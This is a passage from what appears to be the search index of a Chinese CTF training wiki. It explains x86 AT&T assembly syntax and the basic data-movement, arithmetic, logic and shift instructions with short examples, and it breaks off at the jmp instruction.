<p>\u4e3e\u51e0\u4e2a\u4f8b\u5b50 :</p> <pre><code>movb $2, (%ebx) ;\u5c06 2 \u79fb\u5165\u5230 ebx \u4e2d\u7684\u503c\u6240\u8868\u793a\u7684\u5730\u5740\u5355\u5143\u4e2d.\nmovw $2, (%ebx) ;\u5c06 16 \u4f4d\u6574\u6570 2 \u79fb\u52a8\u5230 \u4ece ebx \u4e2d\u7684\u503c\u6240\u8868\u793a\u7684\u5730\u5740\u5355\u5143 \u5f00\u59cb\u7684 2 \u4e2a\u5b57\u8282\u4e2d;\u8fd9\u8bdd\u6709\u70b9\u7ed5, \u6240\u4ee5\u6211\u6545\u610f\u5728\u91cc\u9762\u52a0\u4e86\u70b9\u7a7a\u683c, \u65b9\u4fbf\u5927\u5bb6\u7406\u89e3.\nmovl $2,(%ebx) ;\u5c06 32 \u4f4d\u6574\u6570 2 \u79fb\u52a8\u5230 \u4ece ebx\u4e2d\u7684\u503c\u8868\u793a\u7684\u5730\u5740\u5355\u5143 \u5f00\u59cb\u7684 4 \u4e2a\u5b57\u8282\u4e2d.\n</code></pre>"},{"location":"Training/Material/Reverse/#334-instructions","title":"3.3.4 \u6307\u4ee4 Instructions","text":"<p>\u673a\u5668\u6307\u4ee4\u901a\u5e38\u5206\u4e3a 3 \u7c7b : \u6570\u636e\u79fb\u52a8\u6307\u4ee4, \u903b\u8f91\u8fd0\u7b97\u6307\u4ee4\u548c\u6d41\u7a0b\u63a7\u5236\u6307\u4ee4. \u5728\u672c\u8282\u4e2d, \u6211\u4eec\u5c06\u8bb2\u89e3\u6bcf\u4e00\u79cd\u7c7b\u578b\u7684 x86 \u6307\u4ee4\u4ee5\u53ca\u5b83\u4eec\u7684\u91cd\u8981\u793a\u4f8b. \u5f53\u7136, \u6211\u4eec\u4e0d\u53ef\u80fd\u628a x86 \u6240\u6709\u6307\u4ee4\u8bb2\u5f97\u7279\u522b\u8be6\u7ec6, \u6bd5\u7adf\u7bc7\u5e45\u548c\u6c34\u5e73\u6709\u9650. \u5b8c\u6574\u7684\u6307\u4ee4\u5217\u8868, \u8bf7\u53c2\u9605 intel \u7684\u6307\u4ee4\u96c6\u53c2\u8003\u624b\u518c.</p> <p>\u6211\u4eec\u5c06\u4f7f\u7528\u4ee5\u4e0b\u7b26\u53f7 :</p> <pre><code>&lt;reg32 \u4efb\u610f\u7684 32 \u4f4d\u5bc4\u5b58\u5668 (%eax, %ebx, %ecx, %edx, %esi, %edi, %esp \u6216\u8005 %eb)\n&lt;reg16 \u4efb\u610f\u7684 16 \u4f4d\u5bc4\u5b58\u5668 (%ax, %bx, %cx \u6216\u8005 %dx)\n&lt;reg8 \u4efb\u610f\u7684 8 \u4f4d\u5bc4\u5b58\u5668 (%ah, %al, %bh, %bl, %ch, %cl, %dh, %dl)\n&lt;reg \u4efb\u610f\u7684\u5bc4\u5b58\u5668\n&lt;mem \u4e00\u4e2a\u5185\u5b58\u5730\u5740, \u4f8b\u5982 (%eax), 4+var, (%eax, %ebx, 1)\n&lt;con32 32 \u4f4d\u5e38\u6570\n&lt;con16 16 \u4f4d\u5e38\u6570\n&lt;con8 8 \u4f4d\u5e38\u6570\n&lt;con \u4efb\u610f 32\u4f4d, 16 \u4f4d\u6216\u8005 8 \u4f4d\u5e38\u6570\n</code></pre> <p>\u5728\u6c47\u7f16\u8bed\u8a00\u4e2d, \u7528\u4f5c\u7acb\u5373\u64cd\u4f5c\u6570 \u7684\u6240\u6709\u6807\u7b7e\u548c\u6570\u5b57\u5e38\u91cf ( \u5373\u4e0d\u5728\u8bf8\u5982<code>3 (%eax, %ebx, 8)</code>\u8fd9\u6837\u7684\u5730\u5740\u8ba1\u7b97\u4e2d ) \u603b\u662f\u4ee5\u7f8e\u5143\u7b26\u53f7 $ \u4e3a\u524d\u7f00. \u9700\u8981\u7684\u65f6\u5019, \u524d\u7f00 0x \u8868\u793a\u5341\u516d\u8fdb\u5236\u6570, \u4f8b\u5982<code>$ 0xABC</code>. \u5982\u679c\u6ca1\u6709\u524d\u7f00, \u5219\u9ed8\u8ba4\u8be5\u6570\u5b57\u4e3a\u5341\u8fdb\u5236\u6570.</p>"},{"location":"Training/Material/Reverse/#3341","title":"3.3.4.1 \u6570\u636e\u79fb\u52a8\u6307\u4ee4","text":"<ul> <li><code>mov</code> \u79fb\u52a8</li> </ul> <p><code>mov</code> \u6307\u4ee4\u5c06\u6570\u636e\u4ece\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 ( \u5373\u5bc4\u5b58\u5668\u4e2d\u7684\u5185\u5bb9, \u5185\u5b58\u5355\u5143\u4e2d\u7684\u5185\u5bb9, \u6216\u8005\u4e00\u4e2a\u5e38\u6570\u503c ) \u590d\u5236\u5230\u5b83\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 ( \u5373\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143 ). \u5f53\u5bc4\u5b58\u5668\u5230\u5bc4\u5b58\u5668\u4e4b\u95f4\u7684\u6570\u636e\u79fb\u52a8\u662f\u53ef\u884c\u7684\u65f6\u5019, \u76f4\u63a5\u5730\u4ece\u5185\u5b58\u5355\u5143\u4e2d\u5c06\u6570\u636e\u79fb\u52a8\u5230\u53e6\u4e00\u5185\u5b58\u5355\u5143\u4e2d\u662f\u4e0d\u884c\u7684. \u5728\u8fd9\u79cd\u9700\u8981\u5728\u5185\u5b58\u5355\u5143\u4e2d\u4f20\u9012\u6570\u636e\u7684\u60c5\u51b5\u4e0b, \u5b83\u6570\u636e\u6765\u6e90\u7684\u90a3\u4e2a\u5185\u5b58\u5355\u5143\u5fc5\u987b\u9996\u5148\u628a\u90a3\u4e2a\u5185\u5b58\u5355\u5143\u4e2d\u7684\u6570\u636e\u52a0\u8f7d\u5230\u4e00\u4e2a\u5bc4\u5b58\u5668\u4e2d, \u7136\u540e\u624d\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u5bc4\u5b58\u5668\u6765\u628a\u6570\u636e\u79fb\u52a8\u5230\u76ee\u6807\u5185\u5b58\u5355\u5143\u4e2d.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>mov &lt;reg, &lt;reg\nmov &lt;reg, &lt;mem\nmov &lt;mem, &lt;reg\nmov &lt;con, &lt;reg\nmov &lt;con, &lt;mem\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>mov %ebx, %eax ;\u5c06 EBX \u4e2d\u7684\u503c\u590d\u5236\u5230 EAX \u4e2d\nmov $5, var(,1) ;\u5c06\u6570\u5b57 5 \u5b58\u5230\u5b57\u8282\u578b\u5185\u5b58\u5355\u5143 \" var \"\n</code></pre> <p></p> <ul> <li><code>push</code> \u5165\u6808</li> </ul> <p><code>push</code>\u6307\u4ee4\u5c06\u5b83\u7684\u53c2\u6570\u79fb\u52a8\u5230\u786c\u4ef6\u652f\u6301\u7684\u6808\u5185\u5b58\u9876\u7aef. \u7279\u522b\u5730, <code>push</code> \u9996\u5148\u5c06 ESP \u4e2d\u7684\u503c\u51cf\u5c11 4, \u7136\u540e\u5c06\u5b83\u7684\u53c2\u6570\u79fb\u52a8\u5230\u4e00\u4e2a 32 \u4f4d\u7684\u5730\u5740\u5355\u5143 ( %esp ). ESP ( \u6808\u6307\u9488 ) \u4f1a\u968f\u7740\u4e0d\u65ad\u5165\u6808\u4ece\u800c\u6301\u7eed\u9012\u51cf, \u5373\u6808\u5185\u5b58\u662f\u4ece\u9ad8\u5730\u5740\u5355\u5143\u5230\u4f4e\u5730\u5740\u5355\u5143\u589e\u957f.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>push &lt;reg32\npush &lt;mem\npush &lt;con32\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>push %eax ;\u5c06 EAX \u9001\u5165\u6808\npush var(,1) ;\u5c06 var \u5bf9\u5e94\u7684 4 \u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u9001\u5165\u6808\u4e2d\n</code></pre> <ul> <li><code>pop</code> \u51fa\u6808</li> </ul> <p><code>pop</code>\u6307\u4ee4\u4ece\u786c\u4ef6\u652f\u6301\u7684\u6808\u5185\u5b58\u9876\u7aef\u79fb\u9664 4 \u5b57\u8282\u7684\u6570\u636e, \u5e76\u628a\u8fd9\u4e2a\u6570\u636e\u653e\u5230\u8be5\u6307\u4ee4\u6307\u5b9a\u7684\u53c2\u6570\u4e2d ( \u5373\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143 ). \u5176\u9996\u5148\u5c06\u5185\u5b58\u4e2d ( %esp ) \u7684 4 \u5b57\u8282\u6570\u636e\u653e\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143\u4e2d, \u7136\u540e\u8ba9 ESP + 4.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>pop &lt;reg32\npop &lt;mem\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>pop %edi ;\u5c06\u6808\u9876\u7684\u5143\u7d20\u79fb\u9664, \u5e76\u653e\u5165\u5230\u5bc4\u5b58\u5668 EDI \u4e2d.\npop (%ebx) ;\u5c06\u6808\u9876\u7684\u5143\u7d20\u79fb\u9664, \u5e76\u653e\u5165\u4ece EBX \u5f00\u59cb\u7684 4 \u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u5185\u5b58\u5355\u5143\u4e2d.\n</code></pre> <p>\u91cd\u70b9\u5185\u5bb9 : \u6808 \u6808\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u5b58\u50a8\u7a7a\u95f4, \u7279\u6b8a\u5728\u5b83\u7684\u8bbf\u95ee\u5f62\u5f0f\u4e0a, \u5b83\u7684\u8bbf\u95ee\u5f62\u5f0f\u5c31\u662f\u6700\u540e\u8fdb\u5165\u8fd9\u4e2a\u7a7a\u95f4\u7684\u6570\u636e, \u6700\u5148\u51fa\u53bb, \u4e5f\u5c31\u662f \"\u5148\u8fdb\u540e\u51fa, \u540e\u8fdb\u5148\u51fa\".</p> <ul> <li><code>lea</code>\u52a0\u8f7d\u6709\u6548\u5730\u5740</li> </ul> <p><code>lea</code>\u6307\u4ee4\u5c06\u5176\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u7684\u5185\u5b58\u5355\u5143 \u653e\u5165\u5230 \u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d. \u6ce8\u610f, \u8be5\u6307\u4ee4\u4e0d\u52a0\u8f7d\u5185\u5b58\u5355\u5143\u4e2d\u7684\u5185\u5bb9, \u53ea\u662f\u8ba1\u7b97\u6709\u6548\u5730\u5740\u5e76\u5c06\u5176\u653e\u5165\u5bc4\u5b58\u5668. \u8fd9\u5bf9\u4e8e\u83b7\u5f97\u6307\u5411\u5b58\u50a8\u5668\u533a\u57df\u7684\u6307\u9488\u6216\u8005\u6267\u884c\u7b80\u5355\u7684\u7b97\u672f\u8fd0\u7b97\u975e\u5e38\u6709\u7528.</p> <p>\u4e5f\u8bb8\u8fd9\u91cc\u4f60\u4f1a\u770b\u5f97\u4e00\u5934\u96fe\u6c34, \u4e0d\u8fc7\u4f60\u4e0d\u5fc5\u62c5\u5fc3, \u8fd9\u91cc\u6709\u66f4\u4e3a\u901a\u4fd7\u6613\u61c2\u7684\u89e3\u91ca. \u6c47\u7f16\u8bed\u8a00\u4e2d lea \u6307\u4ee4\u548c mov \u6307\u4ee4\u7684\u533a\u522b ? <code>MOV</code> \u6307\u4ee4\u7684\u529f\u80fd\u662f\u4f20\u9001\u6570\u636e\uff0c\u4f8b\u5982 <code>MOV AX,[1000H]</code>\uff0c\u4f5c\u7528\u662f\u5c06 1000H \u4f5c\u4e3a\u504f\u79fb\u5730\u5740\uff0c\u5bfb\u5740\u627e\u5230\u5185\u5b58\u5355\u5143\uff0c\u5c06\u8be5\u5185\u5b58\u5355\u5143\u4e2d\u7684\u6570\u636e\u9001\u81f3 AX\uff1b <code>LEA</code> \u6307\u4ee4\u7684\u529f\u80fd\u662f\u53d6\u504f\u79fb\u5730\u5740\uff0c\u4f8b\u5982 <code>LEA AX,[1000H]</code>\uff0c\u4f5c\u7528\u662f\u5c06\u6e90\u64cd\u4f5c\u6570 [1000H] \u7684\u504f\u79fb\u5730\u5740 1000H \u9001\u81f3 AX\u3002\u7406\u89e3\u65f6\uff0c\u53ef\u76f4\u63a5\u5c06[ ]\u53bb\u6389\uff0c\u7b49\u540c\u4e8e <code>MOV AX,1000H</code>\u3002 \u518d\u5982\uff1a<code>LEA BX,[AX]</code>\uff0c\u7b49\u540c\u4e8e <code>MOV BX,AX</code>\uff1b<code>LEA BX,TABLE</code> \u7b49\u540c\u4e8e <code>MOV BX,OFFSET TABLE</code>\u3002 \u4f46\u6709\u65f6\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528 <code>MOV</code> \u4ee3\u66ff\uff1a \u6bd4\u5982\uff1a<code>LEA AX,[SI+6]</code> \u4e0d\u80fd\u76f4\u63a5\u66ff\u6362\u6210\uff1a<code>MOV AX,SI+6</code>\uff1b\u4f46\u53ef\u66ff\u6362\u4e3a\uff1a <code>MOV AX,SI</code> <code>ADD AX,6</code> \u4e24\u6b65\u5b8c\u6210\u3002</p> <p>\u53c2\u8003\u94fe\u63a5</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>lea &lt;mem, &lt;reg32\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>lea (%ebx,%esi,8), %edi ;EBX+8*ESI \u7684\u503c\u88ab\u79fb\u5165\u5230\u4e86 EDI\nlea val(,1), %eax ;val \u7684\u503c\u88ab\u79fb\u5165\u5230\u4e86 EAX\n</code></pre>"},{"location":"Training/Material/Reverse/#3342","title":"3.3.4.2 \u903b\u8f91\u8fd0\u7b97\u6307\u4ee4","text":"<ul> <li><code>add</code> \u6574\u6570\u76f8\u52a0</li> </ul> <p><code>add</code> \u6307\u4ee4\u5c06\u4e24\u4e2a\u53c2\u6570\u76f8\u52a0, \u7136\u540e\u5c06\u7ed3\u679c\u5b58\u653e\u5230\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d. \u6ce8\u610f, \u53c2\u6570\u53ef\u4ee5\u662f\u5bc4\u5b58\u5668,\u4f46\u53c2\u6570\u4e2d\u6700\u591a\u53ea\u6709\u4e00\u4e2a\u5185\u5b58\u5355\u5143. \u8fd9\u8bdd\u6709\u70b9\u7ed5, \u6211\u4eec\u76f4\u63a5\u770b\u8bed\u6cd5 :</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>add &lt;reg, &lt;reg\nadd &lt;mem, &lt;reg\nadd &lt;reg, &lt;mem\nadd &lt;con, &lt;reg\nadd &lt;con, &lt;mem\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>add $10, %eax ;EAX \u4e2d\u7684\u503c\u88ab\u8bbe\u7f6e\u4e3a\u4e86 EAX+10.\naddb $10, (%eax) ;\u5f80 EAX \u4e2d\u7684\u503c \u6240\u4ee3\u8868\u7684\u5185\u5b58\u5355\u5143\u5730\u5740 \u52a0\u4e0a 1 \u4e2a\u5b57\u8282\u7684\u6570\u5b57 10.\n</code></pre> <ul> <li><code>sub</code> \u6574\u6570\u76f8\u51cf</li> </ul> <p><code>sub</code>\u6307\u4ee4\u5c06\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c\u4e0e\u7b2c\u4e00\u4e2a\u76f8\u51cf, \u5c31\u662f\u540e\u9762\u90a3\u4e2a\u51cf\u53bb\u524d\u9762\u90a3\u4e2a, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u50a8\u5230\u7b2c\u4e8c\u4e2a\u53c2\u6570. \u548c<code>add</code>\u4e00\u6837, \u4e24\u4e2a\u53c2\u6570\u90fd\u53ef\u4ee5\u662f\u5bc4\u5b58\u5668, \u4f46\u4e24\u4e2a\u53c2\u6570\u4e2d\u6700\u591a\u53ea\u80fd\u6709\u4e00\u4e2a\u662f\u5185\u5b58\u5355\u5143.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>sub &lt;reg, &lt;reg\nsub &lt;mem, &lt;reg\nsub &lt;con, &lt;reg\nsub &lt;con, &lt;mem\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>sub %ah, %al ;AL \u88ab\u8bbe\u7f6e\u6210 AL-AH\nsub $216, %eax ;\u5c06 EAX \u4e2d\u7684\u503c\u51cf\u53bb 216\n</code></pre> <ul> <li><code>inc, dec</code> \u81ea\u589e, \u81ea\u51cf</li> </ul> <p><code>inc</code> \u6307\u4ee4\u8ba9\u5b83\u7684\u53c2\u6570\u52a0 1, <code>dec</code> \u6307\u4ee4\u5219\u662f\u8ba9\u5b83\u7684\u53c2\u6570\u51cf\u53bb 1.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>inc &lt;reg\ninc &lt;mem\ndec &lt;reg\ndec &lt;mem\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>dec %eax ;EAX \u4e2d\u7684\u503c\u51cf\u53bb 1\nincl var(,1) ;\u5c06 var \u6240\u4ee3\u8868\u7684 32 \u4f4d\u6574\u6570\u52a0\u4e0a 1.\n</code></pre> <ul> <li><code>imul</code> \u6574\u6570\u76f8\u4e58</li> </ul> <p><code>imul</code> \u6307\u4ee4\u6709\u4e24\u79cd\u57fa\u672c\u683c\u5f0f : \u7b2c\u4e00\u79cd\u662f 2 \u4e2a\u53c2\u6570\u7684 ( \u770b\u4e0b\u9762\u8bed\u6cd5\u5f00\u59cb\u4e24\u6761 ); \u7b2c\u4e8c\u79cd\u683c\u5f0f\u662f 3 \u4e2a\u53c2\u6570\u7684 ( \u770b\u4e0b\u9762\u8bed\u6cd5\u6700\u540e\u4e24\u6761 ).</p> <p>2 \u4e2a\u53c2\u6570\u7684\u8fd9\u79cd\u683c\u5f0f, \u5148\u662f\u5c06\u4e24\u4e2a\u53c2\u6570\u76f8\u4e58, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u5230\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d. \u8fd0\u7b97\u7ed3\u679c ( \u5373\u7b2c\u4e8c\u4e2a\u53c2\u6570 ) \u5fc5\u987b\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668.</p> <p>3 \u4e2a\u53c2\u6570\u7684\u8fd9\u79cd\u683c\u5f0f, \u5148\u662f\u5c06\u5b83\u7684\u7b2c 1 \u4e2a\u53c2\u6570\u548c\u7b2c 2 \u4e2a\u53c2\u6570\u76f8\u4e58, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u5230\u7b2c 3 \u4e2a\u53c2\u6570\u4e2d, \u5f53\u7136, \u7b2c 3 \u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668. \u6b64\u5916, \u7b2c 1 \u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u4e00\u4e2a\u5e38\u6570.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>imul &lt;reg32, &lt;reg32\nimul &lt;mem, &lt;reg32\nimul &lt;con, &lt;reg32, &lt;reg32\nimul &lt;con, &lt;mem, &lt;reg32\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>imul (%ebx), %eax ;\u5c06 EAX \u4e2d\u7684 32 \u4f4d\u6574\u6570, \u4e0e EBX \u4e2d\u7684\u5185\u5bb9\u6240\u6307\u7684\u5185\u5b58\u5355\u5143, \u76f8\u4e58, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u5230 EAX \u4e2d.\nimul $25, %edi, %esi ;ESI \u88ab\u8bbe\u7f6e\u4e3a EDI * 25.\n</code></pre> <ul> <li><code>idiv</code> \u6574\u6570\u76f8\u9664</li> </ul> <p><code>idiv</code>\u53ea\u6709\u4e00\u4e2a\u64cd\u4f5c\u6570\uff0c\u6b64\u64cd\u4f5c\u6570\u4e3a\u9664\u6570\uff0c\u800c\u88ab\u9664\u6570\u5219\u4e3a EDX : EAX \u4e2d\u7684\u5185\u5bb9\uff08\u4e00\u4e2a64\u4f4d\u7684\u6574\u6570\uff09\uff0c \u9664\u6cd5\u7ed3\u679c ( \u5546 ) \u5b58\u5728 EAX \u4e2d, \u800c\u6240\u5f97\u7684\u4f59\u6570\u5b58\u5728 EDX \u4e2d.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>idiv &lt;reg32\nidiv &lt;mem\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>idiv %ebx ;\u7528 EDX : EAX \u7684\u503c\u9664\u4ee5 EBX \u7684\u503c. \u5546\u5b58\u653e\u5728 EAX \u4e2d, \u4f59\u6570\u5b58\u653e\u5728 EDX \u4e2d.\nidivw (%ebx) ;\u5c06 EDX : EAX \u7684\u503c\u9664\u4ee5\u5b58\u50a8\u5728 EBX \u6240\u5bf9\u5e94\u5185\u5b58\u5355\u5143\u7684 32 \u4f4d\u503c. \u5546\u5b58\u653e\u5728 EAX \u4e2d, \u4f59\u6570\u5b58\u653e\u5728 EDX \u4e2d.\n</code></pre> <ul> <li><code>and, or, xor</code> \u6309\u4f4d\u903b\u8f91 \u4e0e, \u6216, \u5f02\u6216 \u8fd0\u7b97</li> </ul> <p>\u8fd9\u4e9b\u6307\u4ee4\u5206\u522b\u5bf9\u5b83\u4eec\u7684\u53c2\u6570\u8fdb\u884c\u76f8\u5e94\u7684\u903b\u8f91\u8fd0\u7b97, \u8fd0\u7b97\u7ed3\u679c\u5b58\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e2d.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>and &lt;reg, &lt;reg\nand &lt;mem, &lt;reg\nand &lt;reg, &lt;mem\nand &lt;con, &lt;reg\nand &lt;con, &lt;mem\n\nor &lt;reg, &lt;reg\nor &lt;mem, &lt;reg\nor &lt;reg, &lt;mem\nor &lt;con, &lt;reg\nor &lt;con, &lt;mem\n\nxor &lt;reg, &lt;reg\nxor &lt;mem, &lt;reg\nxor &lt;reg, &lt;mem\nxor &lt;con, &lt;reg\nxor &lt;con, &lt;mem\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>and $0x0F, %eax ;\u53ea\u7559\u4e0b EAX \u4e2d\u6700\u540e 4 \u4f4d\u6570\u5b57 (\u4e8c\u8fdb\u5236\u4f4d)\nxor %edx, %edx ;\u5c06 EDX \u7684\u503c\u5168\u90e8\u8bbe\u7f6e\u6210 0\n</code></pre> <ul> <li><code>not</code> \u903b\u8f91\u4f4d\u8fd0\u7b97 \u975e</li> </ul> <p>\u5bf9\u53c2\u6570\u8fdb\u884c\u903b\u8f91\u975e\u8fd0\u7b97, \u5373\u7ffb\u8f6c\u53c2\u6570\u4e2d\u6240\u6709\u4f4d\u7684\u503c.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>not &lt;reg\nnot &lt;mem\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>not %eax ;\u5c06 EAX \u7684\u6240\u6709\u503c\u7ffb\u8f6c.\n</code></pre> <ul> <li><code>neg</code> \u53d6\u8d1f\u6307\u4ee4</li> </ul> <p>\u53d6\u53c2\u6570\u7684\u4e8c\u8fdb\u5236\u8865\u7801\u8d1f\u6570. \u76f4\u63a5\u770b\u4f8b\u5b50\u4e5f\u8bb8\u4f1a\u66f4\u597d\u61c2.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>neg &lt;reg\nneg &lt;mem\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>neg %eax ;EAX \u2192 -EAX\n</code></pre> <ul> <li><code>shl, shr</code> \u6309\u4f4d\u5de6\u79fb\u6216\u8005\u53f3\u79fb</li> </ul> <p>\u8fd9\u4e24\u4e2a\u6307\u4ee4\u5bf9\u7b2c\u4e00\u4e2a\u53c2\u6570\u8fdb\u884c\u4f4d\u8fd0\u7b97, \u79fb\u52a8\u7684\u4f4d\u6570\u7531\u7b2c\u4e8c\u4e2a\u53c2\u6570\u51b3\u5b9a, \u79fb\u52a8\u8fc7\u540e\u7684\u7a7a\u4f4d\u62ff 0 \u8865\u4e0a.\u88ab\u79fb\u7684\u53c2\u6570\u6700\u591a\u53ef\u4ee5\u88ab\u79fb 31 \u4f4d. \u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u662f 8 \u4f4d\u5e38\u6570\u6216\u8005\u5bc4\u5b58\u5668 CL. \u5728\u4efb\u610f\u60c5\u51b5\u4e0b, \u5927\u4e8e 31 \u7684\u79fb\u4f4d\u90fd\u9ed8\u8ba4\u662f\u4e0e 32 \u53d6\u6a21.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>shl &lt;con8, &lt;reg\nshl &lt;con8, &lt;mem\nshl %cl, &lt;reg\nshl %cl, &lt;mem\n\nshr &lt;con8, &lt;reg\nshr &lt;con8, &lt;mem\nshr %cl, &lt;reg\nshr %cl, &lt;mem\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>shl $1, %eax ;\u5c06 EAX \u7684\u503c\u4e58\u4ee5 2 (\u5982\u679c\u6700\u9ad8\u6709\u6548\u4f4d\u662f 0 \u7684\u8bdd)\nshr %cl, %ebx ;\u5c06 EBX \u7684\u503c\u9664\u4ee5 2n, \u5176\u4e2d n \u4e3a CL \u4e2d\u7684\u503c, \u8fd0\u7b97\u6700\u7ec8\u7ed3\u679c\u5b58\u5230 EBX \u4e2d.\n\u4f60\u4e5f\u8bb8\u4f1a\u60f3, \u660e\u660e\u53ea\u662f\u628a\u6570\u5b57\u4e8c\u8fdb\u5236\u79fb\u4e86 1 \u4f4d, \u7ed3\u679c\u5374\u662f\u7b49\u4e8e\u8fd9\u4e2a\u6570\u5b57\u4e58\u4ee5 2.\u4ec0\u4e48\u60c5\u51b5 ? \u8fd9\u51e0\u4e2a\u4f4d\u8fd0\u7b97\u7684\u7ed3\u679c\u548c\u8ba1\u7b97\u673a\u8868\u793a\u6570\u5b57\u7684\u539f\u7406\u6709\u5173,\u8bf7\u770b\u672c\u7ae0\u9644\u5f55\u7684\u8ba1\u7b97\u673a\u6570\u5b57\u8868\u793a.\n</code></pre>"},{"location":"Training/Material/Reverse/#3343","title":"3.3.4.3 \u6d41\u7a0b\u63a7\u5236\u6307\u4ee4","text":"<p>x86 \u5904\u7406\u5668\u6709\u4e00\u4e2a\u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668 ( EIP ), \u8be5\u5bc4\u5b58\u5668\u4e3a 32 \u4f4d\u5bc4\u5b58\u5668, \u5b83\u7528\u6765\u5728\u5185\u5b58\u4e2d\u6307\u793a\u6211\u4eec\u8f93\u5165\u6c47\u7f16\u6307\u4ee4\u7684\u4f4d\u7f6e. \u5c31\u662f\u8bf4\u8fd9\u4e2a\u5bc4\u5b58\u5668\u6307\u5411\u54ea\u4e2a\u5185\u5b58\u5355\u5143, \u90a3\u4e2a\u5355\u5143\u5b58\u50a8\u7684\u673a\u5668\u7801\u5c31\u662f\u7a0b\u5e8f\u6267\u884c\u7684\u6307\u4ee4. \u901a\u5e38\u5b83\u662f\u6307\u5411\u6211\u4eec\u7a0b\u5e8f\u8981\u6267\u884c\u7684 \u4e0b\u4e00\u6761\u6307\u4ee4. \u4f46\u662f\u4f60\u4e0d\u80fd\u76f4\u63a5\u64cd\u4f5c EIP \u5bc4\u5b58\u5668, \u4f60\u9700\u8981\u6d41\u7a0b\u63a7\u5236\u6307\u4ee4\u6765\u9690\u5f0f\u5730\u7ed9\u5b83\u8d4b\u503c.</p> <p>\u6211\u4eec\u4f7f\u7528\u7b26\u53f7 <code>&lt;label</code> \u6765\u5f53\u4f5c\u7a0b\u5e8f\u4e2d\u7684\u6807\u7b7e. \u901a\u8fc7\u8f93\u5165\u6807\u7b7e\u540d\u79f0\u540e\u8ddf\u5192\u53f7, \u53ef\u4ee5\u5c06\u6807\u7b7e\u63d2\u5165 x86 \u6c47\u7f16\u4ee3\u7801\u6587\u672c\u4e2d\u7684\u4efb\u4f55\u4f4d\u7f6e. \u4f8b\u5982 :</p> <pre><code>       mov 8(%ebp), %esi\nbegin:\n       xor %ecx, %ecx\n       mov (%esi), %eax\n</code></pre> <p>\u8be5\u4ee3\u7801\u7247\u6bb5\u4e2d\u7684\u7b2c\u4e8c\u6bb5\u88ab\u5957\u4e0a\u4e86 \" begin \" \u8fd9\u4e2a\u6807\u7b7e. \u5728\u4ee3\u7801\u7684\u5176\u5b83\u5730\u65b9, \u6211\u4eec\u53ef\u4ee5\u7528 \" begin \" \u8fd9\u4e2a\u6807\u7b7e\u4ece\u800c\u66f4\u65b9\u4fbf\u5730\u6765\u5f15\u7528\u8fd9\u6bb5\u6307\u4ee4\u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e. \u8fd9\u4e2a\u6807\u7b7e\u53ea\u662f\u7528\u6765\u66f4\u65b9\u4fbf\u5730\u8868\u793a\u4f4d\u7f6e\u7684, \u5b83\u5e76\u4e0d\u662f\u7528\u6765\u4ee3\u8868\u67d0\u4e2a 32 \u4f4d\u503c.</p> <ul> <li><code>jmp</code> \u8df3\u8f6c\u6307\u4ee4</li> </ul> <p>\u5c06\u7a0b\u5e8f\u8df3\u8f6c\u5230\u53c2\u6570\u6307\u5b9a\u7684\u5185\u5b58\u5730\u5740, \u7136\u540e\u6267\u884c\u8be5\u5185\u5b58\u5730\u5740\u7684\u6307\u4ee4.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>jmp 